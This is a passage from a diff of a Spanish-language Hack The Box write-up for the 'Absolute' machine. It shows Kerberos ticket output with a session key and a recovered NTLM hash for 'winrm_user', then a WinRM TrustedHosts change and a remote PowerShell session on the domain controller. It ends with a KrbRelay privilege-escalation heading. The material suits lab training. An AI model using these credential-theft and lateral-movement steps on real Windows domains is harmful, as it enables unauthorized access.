+      TlZ5SI+fUAsNBlfSvG6mDo6YCFrthm6V42lDcxkfbhLl6ZwWg1GpMsxbcOgWq+riEqtWfKO28liAdVhS
+      pCuyjfWPBkudmf+IqYjqOekk6pml0Xr9AJe0xJ2EEXjAqjZah0n5jRPOZY3wCQRTGmegXOBD9U/6OSgG
+      HcFYukFOyvvSgWPTOE22by5WsJS/DKUMRXSpzjYlmcrlCrdlvOxLFSdSzF9o+aAl4yXJ88LUJGsAZPZR
+      aGhxrPIocz9j+2j9f4LLcxCXTwPbV3QeHkXapBpyUp4kucdaVNPs6FpHZZEzf2Tfc/m0dtaXgHMUbnaf
+      2VKkYCie+WD6n+XLwWMUqnU2C7DP1787JZ0oHa0oyomJTipHXfWIBbpkY9ZjuNy+3dNENJA1RGM5haXh
+      DW3QdmhGjKCxPCt3VpWRz+sTIaOB2DCB1aADAgEAooHNBIHKfYHHMIHEoIHBMIG+MIG7oBswGaADAgEX
+      oRIEEMZRRlW9jUhBvzhk+eeG6/6hDhsMQUJTT0xVVEUuSFRCohcwFaADAgEBoQ4wDBsKd2lucm1fdXNl
+      cqMHAwUAAOEAAKURGA8yMDIzMTEwODE4MzAxNFqmERgPMjAyMzExMDgyMjMwMTRapxEYDzIwMjMxMTA4
+      MjIzMDE0WqgOGwxBQlNPTFVURS5IVEKpITAfoAMCAQKhGDAWGwZrcmJ0Z3QbDGFic29sdXRlLmh0Yg==
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/absolute.htb
+  ServiceRealm             :  ABSOLUTE.HTB
+  UserName                 :  winrm_user
+  UserRealm                :  ABSOLUTE.HTB
+  EndTime                  :  08/11/2023 23:30:14
+  RenewTill                :  08/11/2023 23:30:14
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  xlFGVb2NSEG/OGT554br/g==
+  ASREP (key)              :  908B13B981F87CCB610AE52F5A8F6DE5
+
+[*] Getting credentials using U2U
+
+  CredentialInfo         :
+    Version              : 0
+    EncryptionType       : rc4_hmac
+    CredentialData       :
+      CredentialCount    : 1
+       NTLM              : **8738C7413A5DA3BC1D083EFC0AB06CB2**
+```
+
+El comando se ha ejecutado correctamente y ya tenemos el ticket en memoria.
 
 ```
 PS C:\Users\Alex\Desktop\HTB\Absolute> klist
@@ -1185,6 +1235,8 @@ Vales almacenados en caché: (1)
         KDC llamado:
 ```
 
+Pues como hemos visto anteriormente el usuario pertenece al grupo de `Remote Managament Users`, por lo que ya podríamos acceder por WinRM al DC. Puede ser que de problemas debido a la configuración de la máquina Windows de atacante.
+
 ```
 PS C:\Users\Alex\desktop\HTB\Absolute> Enter-PSSession -ComputerName dc.absolute.htb
 Enter-PSSession : Error de conexión al servidor remoto dc.absolute.htb. Mensaje de error: El cliente WinRM no puede
@@ -1199,6 +1251,7 @@ En línea: 1 Carácter: 1
     + FullyQualifiedErrorId : CreateRemoteRunspaceFailed
 ```
 
+Para solucionarlo simplemente ejecutar el siguiente comando, para añadir a absolute como `Trusted Host`
 
 ```
 PS C:\Users\Alex\desktop\HTB\Absolute> winrm set winrm/config/client '@{TrustedHosts="dc.absolute.htb"}'
@@ -1219,7 +1272,14 @@ Client
     TrustedHosts = dc.absolute.htb
 ```
 
+Y finalmente obtenemos una shell dentro del sistema.
+
 ![img](/assets/img/post/Absolute/20.png)
 
 ## Escalada de Privilegios
 
+### KrbRelay
+
+![[Pasted image 20231108200504.png]]
+
+![[Pasted image 20231108202525.png]]
